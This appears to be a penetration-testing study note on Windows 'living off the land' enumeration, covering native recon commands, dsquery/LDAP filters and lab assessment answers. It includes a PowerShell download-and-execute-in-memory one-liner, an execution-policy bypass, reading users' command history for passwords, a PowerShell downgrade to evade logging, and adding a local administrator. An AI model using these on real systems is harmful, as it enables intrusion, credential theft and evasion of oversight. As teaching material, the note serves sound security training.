---
description: Techniques for utilizing native Windows tools to perform enumeration
---

# Living Off the Land

## Env Commands For Host & Network Recon

### **Basic Enumeration Commands**

<table data-header-hidden><thead><tr><th width="250"></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Result</strong></td></tr><tr><td><code>hostname</code></td><td>Prints the PC's Name</td></tr><tr><td><code>[System.Environment]::OSVersion.Version</code></td><td>Prints out the OS version and revision level</td></tr><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Prints the patches and hotfixes applied to the host</td></tr><tr><td><code>ipconfig /all</code></td><td>Prints out network adapter state and configurations</td></tr><tr><td><code>set %USERDOMAIN%</code></td><td>Displays the domain name to which the host belongs (ran from CMD-prompt)</td></tr><tr><td><code>set %logonserver%</code></td><td>Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)</td></tr></tbody></table>

### **Systeminfo**

will print a summary of the host's information for us in one tidy output



## Harnessing PowerShell

<table data-header-hidden><thead><tr><th width="335"></th><th></th></tr></thead><tbody><tr><td><strong>Cmd-Let</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Get-Module</code></td><td>Lists available modules loaded for use.</td></tr><tr><td><code>Get-ExecutionPolicy -List</code></td><td>Will print the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">execution policy</a> settings for each scope on a host.</td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>This will change the policy for our current process using the <code>-Scope</code> parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.</td></tr><tr><td><code>Get-Content C:\Users\&#x3C;USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td><td>With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</td></tr><tr><td><code>Get-ChildItem Env: | ft Key,Value</code></td><td>Return environment values such as key paths, users, computer information, etc.</td></tr><tr><td><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &#x3C;follow-on commands>"</code></td><td>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</td></tr></tbody></table>

### **Downgrade Powershell**

Powershell event logging was introduced as a feature with Powershell 3.0 and forward. If downgrading is possible we can bypass the event logging.

```powershell-session
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

to check of the logs are being written access `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`

### Checking Defenses

**Firewall Checks**

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```

**Windows Defender Check (from CMD.exe)**

```cmd-session
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

**Get-MpComputerStatus**

check the status and configuration settings

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

## Look for other users

```powershell-session
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

### Network Information

<table data-header-hidden><thead><tr><th width="325"></th><th></th></tr></thead><tbody><tr><td><strong>Networking Commands</strong></td><td><strong>Description</strong></td></tr><tr><td><code>arp -a</code></td><td>Lists all known hosts stored in the arp table.</td></tr><tr><td><code>ipconfig /all</code></td><td>Prints out adapter settings for the host. We can figure out the network segment from here.</td></tr><tr><td><code>route print</code></td><td>Displays the routing table (IPv4 &#x26; IPv6) identifying known networks and layer three routes shared with the host.</td></tr><tr><td><code>netsh advfirewall show state</code></td><td>Displays the status of the host's firewall. We can determine if it is active and filtering traffic.</td></tr></tbody></table>

Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

## Windows Management Instrumentation (WMI)

a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts

**Quick WMI checks**

<table data-header-hidden><thead><tr><th width="345"></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Prints the patch level and description of the Hotfixes applied</td></tr><tr><td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td><td>Displays basic host information to include any attributes within the list</td></tr><tr><td><code>wmic process list /format:list</code></td><td>A listing of all processes on host</td></tr><tr><td><code>wmic ntdomain list /format:list</code></td><td>Displays information about the Domain and Domain Controllers</td></tr><tr><td><code>wmic useraccount list /format:list</code></td><td>Displays information about all local accounts and any domain accounts that have logged into the device</td></tr><tr><td><code>wmic group list /format:list</code></td><td>Information about all local groups</td></tr><tr><td><code>wmic sysaccount list /format:list</code></td><td>Dumps information about any system accounts that are being used as service accounts.</td></tr></tbody></table>

## Net Commands

**Table of Useful Net Commands**

<table data-header-hidden><thead><tr><th width="336"></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr><tr><td><code>net accounts</code></td><td>Information about password requirements</td></tr><tr><td><code>net accounts /domain</code></td><td>Password and lockout policy</td></tr><tr><td><code>net group /domain</code></td><td>Information about domain groups</td></tr><tr><td><code>net group "Domain Admins" /domain</code></td><td>List users with domain admin privileges</td></tr><tr><td><code>net group "domain computers" /domain</code></td><td>List of PCs connected to the domain</td></tr><tr><td><code>net group "Domain Controllers" /domain</code></td><td>List PC accounts of domains controllers</td></tr><tr><td><code>net group &#x3C;domain_group_name> /domain</code></td><td>User that belongs to the group</td></tr><tr><td><code>net groups /domain</code></td><td>List of domain groups</td></tr><tr><td><code>net localgroup</code></td><td>All available groups</td></tr><tr><td><code>net localgroup administrators /domain</code></td><td>List users that belong to the administrators group inside the domain (the group <code>Domain Admins</code> is included here by default)</td></tr><tr><td><code>net localgroup Administrators</code></td><td>Information about a group (admins)</td></tr><tr><td><code>net localgroup administrators [username] /add</code></td><td>Add user to administrators</td></tr><tr><td><code>net share</code></td><td>Check current shares</td></tr><tr><td><code>net user &#x3C;ACCOUNT_NAME> /domain</code></td><td>Get information about a user within the domain</td></tr><tr><td><code>net user /domain</code></td><td>List all users of the domain</td></tr><tr><td><code>net user %username%</code></td><td>Information about the current user</td></tr><tr><td><code>net use x: \computer\share</code></td><td>Mount the share locally</td></tr><tr><td><code>net view</code></td><td>Get a list of computers</td></tr><tr><td><code>net view /all /domain[:domainname]</code></td><td>Shares on the domains</td></tr><tr><td><code>net view \computer /ALL</code></td><td>List shares of a computer</td></tr><tr><td><code>net view /domain</code></td><td>List of PCs of the domain</td></tr></tbody></table>

## Dsquery

command-line tool that can be utilized to find Active Directory objects. `dsquery` will **exist on any host with the `Active Directory Domain Services Role` installed**, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`

We need elevated privilege on a host or from a system context.

**User Search**

```powershell-session
PS C:\htb> dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
. . . < SNIP > . . .
```

**Computer Search**

```powershell-session
PS C:\htb> dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
. . . < SNIP > . . .
```

We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.

**Wildcard Search**

```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
. . . < SNIP > . . .
```

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

**Users With Specific Attributes Set (PASSWD\_NOTREQD)**

```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

**Searching for Domain Controllers**

```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

## LDAP Filtering Explained

`userAccountControl:1.2.840.113556.1.4.803:=8192` are common LDAP queries that can be used in different tools, eg. AD PowerShell, ldapsearch, etc.

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. -> OIDs

`=8192` represents the decimal bitmask we want to match in this search.

![UAC Values](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

**OID match strings**

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803` -> bit value must match completely to meet the search requirements. Great for matching a singular attribute.
2. `1.2.840.113556.1.4.804`-> show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
3. `1.2.840.113556.1.4.1941`-> match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

**Logical Operators**

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:\
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:\
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module.

## Assessment

**Enumerate the host's security configuration information and return the hosts AMProductVersion.**

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption><p>4.18.2109.6</p></figcaption></figure>

**What domain user is explicitly listed as a member of the local Administrators group on the target host?**

<figure><img src="../../../.gitbook/assets/image (28) (2).png" alt=""><figcaption><p>adunn</p></figcaption></figure>

**Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.**

```
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
```

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (81) (1).png" alt=""><figcaption><p>bross -> betty ross</p></figcaption></figure>



